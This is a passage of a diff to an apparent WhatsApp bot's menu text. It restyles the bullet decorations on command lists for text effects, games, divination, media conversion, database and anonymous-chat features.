  ▰▱▰▱▰▱▰▱▰▱▰▱▰
 
@@ -3936,37 +3939,37 @@ break
 │◪〘 TEKSPRO MENU 〙◪
 ╰─────────────────╮
 ╭─────────────────╯
-│➣ ${prefix}3𝚍𝚌𝚑𝚛𝚒𝚜𝚝𝚖𝚊𝚜
-│➣ ${prefix}3𝚍𝚍𝚎𝚎𝚙𝚜𝚎𝚊
-│➣ ${prefix}𝚊𝚖𝚎𝚛𝚒𝚌𝚊𝚗𝚏𝚕𝚊𝚐
-│➣ ${prefix}3𝚍𝚜𝚌𝚒𝚏𝚒
-│➣ ${prefix}3𝚍𝚛𝚊𝚒𝚗𝚋𝚘𝚠
-│➣ ${prefix}3𝚍𝚠𝚊𝚝𝚎𝚛𝚙𝚒𝚙𝚎
-│➣ ${prefix}𝚑𝚊𝚕𝚕𝚘𝚠𝚎𝚎𝚗𝚜𝚔𝚎𝚕𝚎𝚝𝚘𝚗
-│➣ ${prefix}𝚜𝚔𝚎𝚝𝚌𝚑
-│➣ ${prefix}𝚋𝚕𝚞𝚎𝚌𝚒𝚛𝚌𝚞𝚒𝚝
-│➣ ${prefix}𝚜𝚙𝚊𝚌𝚎
-│➣ ${prefix}𝚖𝚎𝚝𝚊𝚕𝚕𝚒𝚌
-│➣ ${prefix}𝚏𝚒𝚌𝚝𝚒𝚘𝚗
-│➣ ${prefix}𝚐𝚛𝚎𝚎𝚗𝚑𝚘𝚛𝚛𝚘𝚛
-│➣ ${prefix}𝚝𝚛𝚊𝚗𝚜𝚏𝚘𝚛𝚖𝚎𝚛
-│➣ ${prefix}𝚋𝚎𝚛𝚛𝚢
-│➣ ${prefix}𝚝𝚑𝚞𝚗𝚍𝚎𝚛
-│➣ ${prefix}𝚖𝚊𝚐𝚖𝚊
-│➣ ${prefix}3𝚍𝚌𝚛𝚊𝚌𝚔𝚎𝚍𝚜𝚝𝚘𝚗𝚎
-│➣ ${prefix}3𝚍𝚗𝚎𝚘𝚗𝚕𝚒𝚐𝚑𝚝
-│➣ ${prefix}𝚒𝚖𝚙𝚛𝚎𝚜𝚜𝚒𝚟𝚎𝚐𝚕𝚒𝚝𝚌𝚑
-│➣ ${prefix}𝚗𝚊𝚝𝚞𝚛𝚊𝚕𝚕𝚎𝚊𝚟𝚎𝚜
-│➣ ${prefix}𝚏𝚒𝚛𝚎𝚠𝚘𝚛𝚔𝚜𝚙𝚊𝚛𝚔𝚕𝚎
-│➣ ${prefix}𝚖𝚊𝚝𝚛𝚒𝚡
-│➣ ${prefix}𝚍𝚛𝚘𝚙𝚠𝚊𝚝𝚎𝚛
-│➣ ${prefix}𝚑𝚊𝚛𝚛𝚢𝚙𝚘𝚝𝚝𝚎𝚛
-│➣ ${prefix}𝚏𝚘𝚐𝚐𝚢𝚠𝚒𝚗𝚍𝚘𝚠
-│➣ ${prefix}𝚗𝚎𝚘𝚗𝚍𝚎𝚟𝚒𝚕𝚜
-│➣ ${prefix}𝚌𝚑𝚛𝚒𝚜𝚝𝚖𝚊𝚜𝚑𝚘𝚕𝚒𝚍𝚊𝚢
-│➣ ${prefix}3𝚍𝚐𝚛𝚊𝚍𝚒𝚎𝚗𝚝
-│➣ ${prefix}𝚋𝚕𝚊𝚌𝚔𝚙𝚒𝚗𝚔
-│➣ ${prefix}𝚐𝚕𝚞𝚎𝚝𝚎𝚡𝚝
+││᭄⃟ꪶ⃟•╾ ${prefix}3𝚍𝚌𝚑𝚛𝚒𝚜𝚝𝚖𝚊𝚜
+││᭄⃟ꪶ⃟•╾ ${prefix}3𝚍𝚍𝚎𝚎𝚙𝚜𝚎𝚊
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚖𝚎𝚛𝚒𝚌𝚊𝚗𝚏𝚕𝚊𝚐
+││᭄⃟ꪶ⃟•╾ ${prefix}3𝚍𝚜𝚌𝚒𝚏𝚒
+││᭄⃟ꪶ⃟•╾ ${prefix}3𝚍𝚛𝚊𝚒𝚗𝚋𝚘𝚠
+││᭄⃟ꪶ⃟•╾ ${prefix}3𝚍𝚠𝚊𝚝𝚎𝚛𝚙𝚒𝚙𝚎
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚊𝚕𝚕𝚘𝚠𝚎𝚎𝚗𝚜𝚔𝚎𝚕𝚎𝚝𝚘𝚗
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚔𝚎𝚝𝚌𝚑
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚕𝚞𝚎𝚌𝚒𝚛𝚌𝚞𝚒𝚝
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚙𝚊𝚌𝚎
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚖𝚎𝚝𝚊𝚕𝚕𝚒𝚌
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚏𝚒𝚌𝚝𝚒𝚘𝚗
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚛𝚎𝚎𝚗𝚑𝚘𝚛𝚛𝚘𝚛
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚛𝚊𝚗𝚜𝚏𝚘𝚛𝚖𝚎𝚛
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚎𝚛𝚛𝚢
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚑𝚞𝚗𝚍𝚎𝚛
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚖𝚊𝚐𝚖𝚊
+││᭄⃟ꪶ⃟•╾ ${prefix}3𝚍𝚌𝚛𝚊𝚌𝚔𝚎𝚍𝚜𝚝𝚘𝚗𝚎
+││᭄⃟ꪶ⃟•╾ ${prefix}3𝚍𝚗𝚎𝚘𝚗𝚕𝚒𝚐𝚑𝚝
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚒𝚖𝚙𝚛𝚎𝚜𝚜𝚒𝚟𝚎𝚐𝚕𝚒𝚝𝚌𝚑
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚊𝚝𝚞𝚛𝚊𝚕𝚕𝚎𝚊𝚟𝚎𝚜
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚏𝚒𝚛𝚎𝚠𝚘𝚛𝚔𝚜𝚙𝚊𝚛𝚔𝚕𝚎
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚖𝚊𝚝𝚛𝚒𝚡
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚛𝚘𝚙𝚠𝚊𝚝𝚎𝚛
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚊𝚛𝚛𝚢𝚙𝚘𝚝𝚝𝚎𝚛
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚏𝚘𝚐𝚐𝚢𝚠𝚒𝚗𝚍𝚘𝚠
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚎𝚘𝚗𝚍𝚎𝚟𝚒𝚕𝚜
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚌𝚑𝚛𝚒𝚜𝚝𝚖𝚊𝚜𝚑𝚘𝚕𝚒𝚍𝚊𝚢
+││᭄⃟ꪶ⃟•╾ ${prefix}3𝚍𝚐𝚛𝚊𝚍𝚒𝚎𝚗𝚝
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚕𝚊𝚌𝚔𝚙𝚒𝚗𝚔
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚕𝚞𝚎𝚝𝚎𝚡𝚝
 ╰─────────────────╯
  ▰▱▰▱▰▱▰▱▰▱▰▱▰
 
@@ -3983,18 +3986,18 @@ break
 │◪〘EPHITOOXY MENU〙◪
 ╰─────────────────╮
 ╭─────────────────╯
-│➣ ${prefix}𝚜𝚑𝚊𝚍𝚘𝚠
-│➣ ${prefix}𝚛𝚘𝚖𝚊𝚗𝚝𝚒𝚌
-│➣ ${prefix}𝚜𝚖𝚘𝚔𝚎
-│➣ ${prefix}𝚋𝚞𝚛𝚗𝚙𝚊𝚙𝚙𝚎𝚛
-│➣ ${prefix}𝚗𝚊𝚛𝚞𝚝𝚘
-│➣ ${prefix}𝚕𝚘𝚟𝚎𝚖𝚜𝚐
-│➣ ${prefix}𝚐𝚛𝚊𝚜𝚜𝚖𝚜𝚐
-│➣ ${prefix}𝚕𝚘𝚟𝚎𝚝𝚎𝚡𝚝
-│➣ ${prefix}𝚌𝚘𝚏𝚏𝚎𝚌𝚞𝚙
-│➣ ${prefix}𝚋𝚞𝚝𝚝𝚎𝚛𝚏𝚕𝚢
-│➣ ${prefix}𝚑𝚊𝚛𝚛𝚢𝚙𝚘𝚝𝚝𝚎𝚛
-│➣ ${prefix}𝚛𝚎𝚝𝚛𝚘𝚕𝚘𝚕
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚑𝚊𝚍𝚘𝚠
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚘𝚖𝚊𝚗𝚝𝚒𝚌
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚖𝚘𝚔𝚎
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚞𝚛𝚗𝚙𝚊𝚙𝚙𝚎𝚛
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚊𝚛𝚞𝚝𝚘
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚘𝚟𝚎𝚖𝚜𝚐
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚛𝚊𝚜𝚜𝚖𝚜𝚐
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚘𝚟𝚎𝚝𝚎𝚡𝚝
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚌𝚘𝚏𝚏𝚎𝚌𝚞𝚙
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚞𝚝𝚝𝚎𝚛𝚏𝚕𝚢
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚊𝚛𝚛𝚢𝚙𝚘𝚝𝚝𝚎𝚛
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚎𝚝𝚛𝚘𝚕𝚘𝚕
 ╰─────────────────╯
  ▰▱▰▱▰▱▰▱▰▱▰▱▰
 
@@ -4011,15 +4014,15 @@ break
 │ ◪〘 EPHOTO MENU 〙◪
 ╰─────────────────╮
 ╭─────────────────╯
-│➣ ${prefix}𝚏𝚏𝚌𝚘𝚟𝚎𝚛
-│➣ ${prefix}𝚌𝚛𝚘𝚜𝚜𝚏𝚒𝚛𝚎
-│➣ ${prefix}𝚐𝚊𝚕𝚊𝚡𝚢
-│➣ ${prefix}𝚐𝚕𝚊𝚜𝚜
-│➣ ${prefix}𝚗𝚎𝚘𝚗
-│➣ ${prefix}𝚋𝚎𝚊𝚌𝚑
-│➣ ${prefix}𝚋𝚕𝚊𝚌𝚔𝚙𝚒𝚗𝚔
-│➣ ${prefix}𝚒𝚐𝚌𝚎𝚛𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚎
-│➣ ${prefix}𝚢𝚝𝚌𝚎𝚛𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚎
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚏𝚏𝚌𝚘𝚟𝚎𝚛
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚌𝚛𝚘𝚜𝚜𝚏𝚒𝚛𝚎
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚊𝚕𝚊𝚡𝚢
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚕𝚊𝚜𝚜
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚎𝚘𝚗
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚎𝚊𝚌𝚑
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚕𝚊𝚌𝚔𝚙𝚒𝚗𝚔
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚒𝚐𝚌𝚎𝚛𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚎
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚢𝚝𝚌𝚎𝚛𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚎
 ╰─────────────────╯
  ▰▱▰▱▰▱▰▱▰▱▰▱▰
 
@@ -4036,20 +4039,20 @@ break
 │    ◪〘 FUN MENU 〙◪
 ╰─────────────────╮
 ╭─────────────────╯
-│➣ ${prefix}𝚜𝚒𝚖𝚒𝚑
-│➣ ${prefix}𝚑𝚊𝚕𝚊𝚑
-│➣ ${prefix}𝚑𝚒𝚕𝚒𝚑
-│➣ ${prefix}𝚑𝚞𝚕𝚞𝚑
-│➣ ${prefix}𝚑𝚎𝚕𝚎𝚑
-│➣ ${prefix}𝚑𝚘𝚕𝚘𝚑
-│➣ ${prefix}𝚓𝚊𝚍𝚒𝚊𝚗
-│➣ ${prefix}𝚓𝚘𝚍𝚘𝚑𝚔𝚞
-│➣ ${prefix}𝚍𝚎𝚕𝚝𝚝𝚝
-│➣ ${prefix}𝚝𝚒𝚌𝚝𝚊𝚌𝚝𝚘𝚎
-│➣ ${prefix}𝚏𝚊𝚖𝚒𝚕𝚢100
-│➣ ${prefix}𝚝𝚎𝚋𝚊𝚔 [𝚘𝚙𝚝𝚒𝚘𝚗]
-│➣ ${prefix}𝚖𝚊𝚝𝚑 [𝚖𝚘𝚍𝚎]
-│➣ ${prefix}𝚜𝚞𝚒𝚝𝚙𝚟𝚙 [@𝚝𝚊𝚐]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚒𝚖𝚒𝚑
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚊𝚕𝚊𝚑
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚒𝚕𝚒𝚑
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚞𝚕𝚞𝚑
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚎𝚕𝚎𝚑
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚘𝚕𝚘𝚑
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚓𝚊𝚍𝚒𝚊𝚗
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚓𝚘𝚍𝚘𝚑𝚔𝚞
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚎𝚕𝚝𝚝𝚝
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚒𝚌𝚝𝚊𝚌𝚝𝚘𝚎
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚏𝚊𝚖𝚒𝚕𝚢100
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚎𝚋𝚊𝚔 [𝚘𝚙𝚝𝚒𝚘𝚗]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚖𝚊𝚝𝚑 [𝚖𝚘𝚍𝚎]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚞𝚒𝚝𝚙𝚟𝚙 [@𝚝𝚊𝚐]
 ╰─────────────────╯
  ▰▱▰▱▰▱▰▱▰▱▰▱▰
 
@@ -4066,36 +4069,36 @@ break
 │ ◪〘 PRIMBON MENU 〙◪
 ╰─────────────────╮
 ╭─────────────────╯
-│➣ ${prefix}𝚗𝚘𝚖𝚘𝚛𝚑𝚘𝚔𝚒
-│➣ ${prefix}𝚊𝚛𝚝𝚒𝚖𝚒𝚖𝚙𝚒
-│➣ ${prefix}𝚊𝚛𝚝𝚒𝚗𝚊𝚖𝚊
-│➣ ${prefix}𝚛𝚊𝚖𝚊𝚕𝚓𝚘𝚍𝚘𝚑
-│➣ ${prefix}𝚛𝚊𝚖𝚊𝚕𝚓𝚘𝚍𝚘𝚑𝚋𝚊𝚕𝚒
-│➣ ${prefix}𝚜𝚞𝚊𝚖𝚒𝚒𝚜𝚝𝚛𝚒
-│➣ ${prefix}𝚛𝚊𝚖𝚊𝚕𝚌𝚒𝚗𝚝𝚊
-│➣ ${prefix}𝚌𝚘𝚌𝚘𝚔𝚗𝚊𝚖𝚊
-│➣ ${prefix}𝚙𝚊𝚜𝚊𝚗𝚐𝚊𝚗
-│➣ ${prefix}𝚓𝚊𝚍𝚒𝚊𝚗𝚗𝚒𝚔𝚊𝚑
-│➣ ${prefix}𝚜𝚒𝚏𝚊𝚝𝚞𝚜𝚊𝚑𝚊
-│➣ ${prefix}𝚛𝚎𝚣𝚎𝚔𝚒
-│➣ ${prefix}𝚙𝚎𝚔𝚎𝚛𝚓𝚊𝚊𝚗
-│➣ ${prefix}𝚗𝚊𝚜𝚒𝚋
-│➣ ${prefix}𝚙𝚎𝚗𝚢𝚊𝚔𝚒𝚝
-│➣ ${prefix}𝚝𝚊𝚛𝚘𝚝
-│➣ ${prefix}𝚏𝚎𝚗𝚐𝚜𝚑𝚞𝚒
-│➣ ${prefix}𝚑𝚊𝚛𝚒𝚋𝚊𝚒𝚔
-│➣ ${prefix}𝚑𝚊𝚛𝚒𝚜𝚊𝚗𝚐𝚊𝚛
-│➣ ${prefix}𝚑𝚊𝚛𝚒𝚜𝚒𝚊𝚕
-│➣ ${prefix}𝚗𝚊𝚐𝚊𝚑𝚊𝚛𝚒
-│➣ ${prefix}𝚊𝚛𝚊𝚑𝚛𝚎𝚣𝚎𝚔𝚒
-│➣ ${prefix}𝚙𝚎𝚛𝚞𝚗𝚝𝚞𝚗𝚐𝚊𝚗
-│➣ ${prefix}𝚠𝚎𝚝𝚘𝚗
-│➣ ${prefix}𝚔𝚊𝚛𝚊𝚔𝚝𝚎𝚛
-│➣ ${prefix}𝚔𝚎𝚋𝚎𝚛𝚞𝚗𝚝𝚞𝚗𝚐𝚊𝚗
-│➣ ${prefix}𝚖𝚎𝚖𝚊𝚗𝚌𝚒𝚗𝚐
-│➣ ${prefix}𝚖𝚊𝚜𝚊𝚜𝚞𝚋𝚞𝚛
-│➣ ${prefix}𝚣𝚘𝚍𝚒𝚊𝚔
-│➣ ${prefix}𝚜𝚑𝚒𝚘
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚘𝚖𝚘𝚛𝚑𝚘𝚔𝚒
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚛𝚝𝚒𝚖𝚒𝚖𝚙𝚒
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚛𝚝𝚒𝚗𝚊𝚖𝚊
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚊𝚖𝚊𝚕𝚓𝚘𝚍𝚘𝚑
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚊𝚖𝚊𝚕𝚓𝚘𝚍𝚘𝚑𝚋𝚊𝚕𝚒
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚞𝚊𝚖𝚒𝚒𝚜𝚝𝚛𝚒
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚊𝚖𝚊𝚕𝚌𝚒𝚗𝚝𝚊
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚌𝚘𝚌𝚘𝚔𝚗𝚊𝚖𝚊
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚊𝚜𝚊𝚗𝚐𝚊𝚗
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚓𝚊𝚍𝚒𝚊𝚗𝚗𝚒𝚔𝚊𝚑
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚒𝚏𝚊𝚝𝚞𝚜𝚊𝚑𝚊
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚎𝚣𝚎𝚔𝚒
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚎𝚔𝚎𝚛𝚓𝚊𝚊𝚗
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚊𝚜𝚒𝚋
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚎𝚗𝚢𝚊𝚔𝚒𝚝
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚊𝚛𝚘𝚝
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚏𝚎𝚗𝚐𝚜𝚑𝚞𝚒
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚊𝚛𝚒𝚋𝚊𝚒𝚔
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚊𝚛𝚒𝚜𝚊𝚗𝚐𝚊𝚛
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚊𝚛𝚒𝚜𝚒𝚊𝚕
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚊𝚐𝚊𝚑𝚊𝚛𝚒
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚛𝚊𝚑𝚛𝚎𝚣𝚎𝚔𝚒
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚎𝚛𝚞𝚗𝚝𝚞𝚗𝚐𝚊𝚗
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚠𝚎𝚝𝚘𝚗
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚔𝚊𝚛𝚊𝚔𝚝𝚎𝚛
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚔𝚎𝚋𝚎𝚛𝚞𝚗𝚝𝚞𝚗𝚐𝚊𝚗
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚖𝚎𝚖𝚊𝚗𝚌𝚒𝚗𝚐
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚖𝚊𝚜𝚊𝚜𝚞𝚋𝚞𝚛
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚣𝚘𝚍𝚒𝚊𝚔
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚑𝚒𝚘
 ╰─────────────────╯
  ▰▱▰▱▰▱▰▱▰▱▰▱▰
 
@@ -4112,23 +4115,23 @@ break
 │◪〘 CONVERT MENU 〙◪
 ╰─────────────────╮
 ╭─────────────────╯
-│➣ ${prefix}𝚊𝚝𝚝𝚙
-│➣ ${prefix}𝚝𝚝𝚙
-│➣ ${prefix}𝚝𝚘𝚒𝚖𝚊𝚐𝚎
-│➣ ${prefix}𝚛𝚎𝚖𝚘𝚟𝚎𝚋𝚐
-│➣ ${prefix}𝚜𝚝𝚒𝚌𝚔𝚎𝚛
-│➣ ${prefix}𝚎𝚖𝚘𝚓𝚒𝚖𝚒𝚡
-│➣ ${prefix}𝚎𝚖𝚘𝚓𝚒𝚖𝚒𝚡2
-│➣ ${prefix}𝚝𝚘𝚟𝚒𝚍𝚎𝚘
-│➣ ${prefix}𝚝𝚘𝚐𝚒𝚏
-│➣ ${prefix}𝚝𝚘𝚞𝚛𝚕
-│➣ ${prefix}𝚝𝚘𝚟𝚗
-│➣ ${prefix}𝚝𝚘𝚖𝚙3
-│➣ ${prefix}𝚝𝚘𝚊𝚞𝚍𝚒𝚘
-│➣ ${prefix}𝚎𝚋𝚒𝚗𝚊𝚛𝚢
-│➣ ${prefix}𝚍𝚋𝚒𝚗𝚊𝚛𝚢
-│➣ ${prefix}𝚜𝚝𝚢𝚕𝚎𝚝𝚎𝚡𝚝
-│➣ ${prefix}𝚜𝚖𝚎𝚖𝚎
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚝𝚝𝚙
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚝𝚙
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚘𝚒𝚖𝚊𝚐𝚎
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚎𝚖𝚘𝚟𝚎𝚋𝚐
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚝𝚒𝚌𝚔𝚎𝚛
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚎𝚖𝚘𝚓𝚒𝚖𝚒𝚡
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚎𝚖𝚘𝚓𝚒𝚖𝚒𝚡2
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚘𝚟𝚒𝚍𝚎𝚘
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚘𝚐𝚒𝚏
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚘𝚞𝚛𝚕
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚘𝚟𝚗
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚘𝚖𝚙3
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚘𝚊𝚞𝚍𝚒𝚘
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚎𝚋𝚒𝚗𝚊𝚛𝚢
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚋𝚒𝚗𝚊𝚛𝚢
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚝𝚢𝚕𝚎𝚝𝚎𝚡𝚝
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚖𝚎𝚖𝚎
 ╰─────────────────╯
  ▰▱▰▱▰▱▰▱▰▱▰▱▰
 
@@ -4145,16 +4148,16 @@ break
 │   ◪〘 MAIN MENU 〙◪
 ╰─────────────────╮
 ╭─────────────────╯
-│➣ ${prefix}𝚙𝚒𝚗𝚐
-│➣ ${prefix}𝚘𝚠𝚗𝚎𝚛
-│➣ ${prefix}𝚖𝚎𝚗𝚞 / 𝚑𝚎𝚕𝚙 / ?
-│➣ ${prefix}𝚍𝚎𝚕𝚎𝚝𝚎
-│➣ ${prefix}𝚒𝚗𝚏𝚘𝚌𝚑𝚊𝚝
-│➣ ${prefix}𝚚𝚞𝚘𝚝𝚎𝚍
-│➣ ${prefix}𝚕𝚒𝚜𝚝𝚙𝚌
-│➣ ${prefix}𝚕𝚒𝚜𝚝𝚐𝚌
-│➣ ${prefix}𝚕𝚒𝚜𝚝𝚘𝚗𝚕𝚒𝚗𝚎
-│➣ ${prefix}𝚜𝚙𝚎𝚎𝚍𝚝𝚎𝚜𝚝
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚒𝚗𝚐
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚘𝚠𝚗𝚎𝚛
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚖𝚎𝚗𝚞 / 𝚑𝚎𝚕𝚙 / ?
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚎𝚕𝚎𝚝𝚎
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚒𝚗𝚏𝚘𝚌𝚑𝚊𝚝
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚚𝚞𝚘𝚝𝚎𝚍
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚒𝚜𝚝𝚙𝚌
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚒𝚜𝚝𝚐𝚌
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚒𝚜𝚝𝚘𝚗𝚕𝚒𝚗𝚎
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚙𝚎𝚎𝚍𝚝𝚎𝚜𝚝
 ╰─────────────────╯
  ▰▱▰▱▰▱▰▱▰▱▰▱▰
 
@@ -4171,14 +4174,14 @@ break
 │◪〘 DATABASE MENU 〙◪
 ╰─────────────────╮
 ╭─────────────────╯
-│➣ ${prefix}𝚜𝚎𝚝𝚌𝚖𝚍
-│➣ ${prefix}𝚕𝚒𝚜𝚝𝚌𝚖𝚍
-│➣ ${prefix}𝚍𝚎𝚕𝚌𝚖𝚍
-│➣ ${prefix}𝚕𝚘𝚌𝚔𝚌𝚖𝚍
-│➣ ${prefix}𝚊𝚍𝚍𝚖𝚜𝚐
-│➣ ${prefix}𝚕𝚒𝚜𝚝𝚖𝚜𝚐
-│➣ ${prefix}𝚐𝚎𝚝𝚖𝚜𝚐
-│➣ ${prefix}𝚍𝚎𝚕𝚖𝚜𝚐
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚎𝚝𝚌𝚖𝚍
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚒𝚜𝚝𝚌𝚖𝚍
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚎𝚕𝚌𝚖𝚍
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚘𝚌𝚔𝚌𝚖𝚍
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚍𝚍𝚖𝚜𝚐
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚒𝚜𝚝𝚖𝚜𝚐
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚎𝚝𝚖𝚜𝚐
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚎𝚕𝚖𝚜𝚐
 ╰─────────────────╯
  ▰▱▰▱▰▱▰▱▰▱▰▱▰
 
@@ -4195,10 +4198,10 @@ break
 │ ◪〘 ANONYM MENU 〙◪
 ╰─────────────────╮
 ╭─────────────────╯
-│➣ ${prefix}𝚊𝚗𝚘𝚗𝚢𝚖𝚘𝚞𝚜
-│➣ ${prefix}𝚜𝚝𝚊𝚛𝚝
-│➣ ${prefix}𝚗𝚎𝚡𝚝
-│➣ ${prefix}𝚔𝚎𝚕𝚞𝚊𝚛
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚗𝚘𝚗𝚢𝚖𝚘𝚞𝚜
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚝𝚊𝚛𝚝
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚎𝚡𝚝
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚔𝚎𝚕𝚞𝚊𝚛
 ╰─────────────────╯
  ▰▱▰▱▰▱▰▱▰▱▰▱▰
 
@@ -4215,11 +4218,11 @@ break
 │ ◪〘 ISLAMIC MENU 〙◪
 ╰─────────────────╮
 ╭─────────────────╯
-│➣ ${prefix}𝚒𝚚𝚛𝚊
